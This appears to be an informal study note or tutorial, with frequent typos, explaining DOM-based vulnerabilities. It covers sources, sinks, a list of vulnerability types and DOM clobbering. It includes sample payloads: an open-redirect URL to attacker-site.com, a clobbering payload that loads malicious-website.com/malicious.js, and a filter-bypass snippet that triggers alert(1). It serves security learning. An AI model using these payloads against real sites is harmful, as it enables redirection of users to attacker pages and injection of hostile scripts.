DOM-Document Object Model

DOM is the heirerichal representation of the elements in a web browser.Website can use Javascript to manipulate the nodes of the nodes of the DOM,infact it's quite common and important in the modern day websites,but the problem arises when the javascript uses unsanitized data(user input which is not processed) to modify the DOM,this can lead to an attacker adding some malicious scripts and the JS passes it into a dangerous function

Before proceeding further with the the DOM based vulnerabilities,we need to first understand the basic terms 

+++++ SOURCE +++++

Source is a JS property that accepts data that is potentially attacker-controlled.An example would be "location.search" which reads the input from the query string.Basically any property that an attacker can control is a source,this includes the referring URL (which is exposed by document.referrer),the cookies exposed by (document.cookies)

+++++        ++++++

+++++ SINK +++++

Sink is a potentially javascript function or DOM object that can cause undesirable effects if the atatcker-controlled data is parsed to it.An example of an HTML sink is document.body.innerHTML because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript

+++++        ++++++


Given an example of a source code


goto = location.hash.slice(1)
if(goto.startsWith('https:')) {
  location = goto;
} 

The most common source is the location object which handles the URL of the object.In the above source code,the location.hash is handled in an unsafe way.If the url contains a # that starts with https:// it sets the value of the location to that value,thus an attacker can use it to divert a user to diiferent page by constructing a payload like.

https://website.com#https://attacker-site.com

what the codes does is that it will extract the value
"https://attacker-site.com"
and assign it to location object,which in turn will redirect the page to that attacker's site.


++++++++++ COMMON SOURCES ++++++++++

 The following are typical sources that can be used to exploit 

document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database 



++++++++++ SINKS THAT CAN BE USED TO EXPLOIT VULNERABILITIES ++++++++++


DOM-based vulnerability 		Example sink
-----------------------     	-------------

DOM XSS LABS 					document.write()
Open redirection LABS 			window.location
Cookie manipulation LABS 		document.cookie
JavaScript injection 			eval()
Document-domain manipulation 	document.domain
WebSocket-URL poisoning 		WebSocket()
Link manipulation 				someElement.src
Web-message manipulation 		postMessage()
Ajax request-header manip. 		setRequestHeader()
Local file-path manipulation 	FileReader.readAsText()
Client-side SQL injection 		ExecuteSql()
HTML5-storage manipulation 		sessionStorage.setItem()
Client-side XPath injection 	document.evaluate()
Client-side JSON injection 		JSON.parse()
DOM-data manipulation 			someElement.setAttribute()
Denial of service 				RegExp() 





++++++++++++++++++++ DOM CLOBBERING ++++++++++++++++++++


DOM clobbering is the type of vulnerability in which an attacker can inject HTML into the page to manipulate the DOM where the XSS is not possible,but the attacker can control some of the tags such as id or name which are whitelisted by the HTML filter.The most common form of DOM clobbering is where the anchor elements are used to over-write the global variable


 A common pattern used by JavaScript developers is:

var someObject = window.someObject || {};

If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as an anchor. Consider the following code:

<script>
 window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
 };
</script>

To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an anchor element:

<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js> 


another common technique is to use form element with input tag.FOr ex: clobbering attributes tag helps to bypass client side filters

ex:<form onclick=alert(1)><input id=attributes>Click me


n this case, the client-side filter would traverse the DOM and encounter a whitelisted form element. Normally, the filter would loop through the attributes property of the form element and remove any blacklisted attributes. However, because the attributes property has been clobbered with the input element, the filter loops through the input element instead. As the input element has an undefined length, the conditions for the for loop of the filter (for example i"element.attributes.length") are not met, and the filter simply moves on to the next element instead. This results in the onclick event being ignored altogether by the filter, which subsequently allows the alert() function to be called in the browser. 